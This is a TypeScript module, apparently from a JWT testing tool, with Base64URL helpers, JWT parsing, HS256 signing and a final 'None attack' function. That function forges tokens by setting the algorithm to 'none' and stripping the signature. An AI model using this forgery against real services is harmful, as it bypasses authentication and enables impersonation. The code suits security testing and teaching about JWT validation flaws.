import CryptoJS from 'crypto-js';

// ==========================================
// 1. Base64URL Decoding/Encoding
// ==========================================

/**
 * Converts a CryptoJS WordArray to a Base64URL string.
 */
export const base64UrlEncode = (wordArray: CryptoJS.lib.WordArray): string => {
    const base64 = CryptoJS.enc.Base64.stringify(wordArray);
    return base64
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
};

/**
 * Decodes a Base64URL string to a UTF-8 string.
 */
export const base64UrlDecode = (str: string): string => {
    // Add padding if needed
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    const pad = base64.length % 4;
    if (pad) {
        base64 += new Array(5 - pad).join('=');
    }
    
    try {
        const parsed = CryptoJS.enc.Base64.parse(base64);
        return parsed.toString(CryptoJS.enc.Utf8);
    } catch (e) {
        throw new Error("Invalid Base64URL string");
    }
};

/**
 * Helper to encode a standard UTF-8 string to Base64URL.
 */
export const stringToBase64Url = (str: string): string => {
    const wordArray = CryptoJS.enc.Utf8.parse(str);
    return base64UrlEncode(wordArray);
};

// ==========================================
// 2. JWT Parsing
// ==========================================

export interface ParsedJWT {
    header: any;
    payload: any;
    signature: string;
    rawHeader: string;
    rawPayload: string;
    valid: boolean;
}

export const parseJWT = (token: string): ParsedJWT => {
    const parts = token.split('.');
    
    if (parts.length !== 3) {
        throw new Error("Invalid JWT format. Expected 3 parts separated by dots.");
    }

    const [rawHeader, rawPayload, signature] = parts;

    try {
        const headerStr = base64UrlDecode(rawHeader);
        const payloadStr = base64UrlDecode(rawPayload);

        return {
            header: JSON.parse(headerStr),
            payload: JSON.parse(payloadStr),
            signature,
            rawHeader,
            rawPayload,
            valid: true
        };
    } catch (e) {
        throw new Error("Failed to parse JWT parts. Ensure they are valid Base64URL.");
    }
};

// ==========================================
// 3. Signing (HS256)
// ==========================================

/**
 * Signs a header and payload with a secret using HS256.
 */
export const signJWT = (header: object, payload: object, secret: string): string => {
    const headerStr = JSON.stringify(header);
    const payloadStr = JSON.stringify(payload);

    const encodedHeader = stringToBase64Url(headerStr);
    const encodedPayload = stringToBase64Url(payloadStr);

    const dataToSign = `${encodedHeader}.${encodedPayload}`;
    
    // Sign using HMAC-SHA256
    const signatureWordArray = CryptoJS.HmacSHA256(dataToSign, secret);
    const encodedSignature = base64UrlEncode(signatureWordArray);

    return `${dataToSign}.${encodedSignature}`;
};

// ==========================================
// 4. "None" Attack
// ==========================================

/**
 * Creates a forged token with the "none" algorithm.
 * It modifies the header, re-encodes, and strips the signature.
 */
export const createNoneToken = (token: string): string => {
    try {
        const parsed = parseJWT(token);
        
        // 1. Modify Header to alg: none
        const newHeader = { ...parsed.header, alg: 'none' };
        
        // 2. Re-encode Header and Payload
        // (We keep the payload as is, or you could modify it here if needed)
        const encodedHeader = stringToBase64Url(JSON.stringify(newHeader));
        const encodedPayload = parsed.rawPayload; // Reuse raw payload to preserve exact formatting if unchanged

        // 3. Construct token with empty signature (trailing dot is crucial)
        return `${encodedHeader}.${encodedPayload}.`;
        
    } catch (e) {
        console.error("None attack failed:", e);
        return "";
    }
};
